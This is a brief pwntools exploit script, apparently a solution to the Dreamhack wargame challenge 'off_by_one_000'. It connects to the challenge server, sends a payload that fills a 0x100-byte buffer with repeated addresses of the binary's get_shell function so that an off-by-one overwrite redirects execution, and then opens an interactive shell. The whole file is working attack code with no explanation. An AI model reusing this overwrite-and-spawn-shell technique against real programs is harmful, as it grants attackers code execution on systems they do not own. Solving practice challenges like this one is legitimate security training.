#!/usr/bin/env python2

from pwn import *

context.log_level = "debug"

HOST = "host1.dreamhack.games"
PORT = 14870

e = ELF("./off_by_one_000")
conn = remote(HOST, PORT)

payload = p32(e.symbols["get_shell"]) * (0x100/4)

conn.sendline(payload)
conn.interactive()
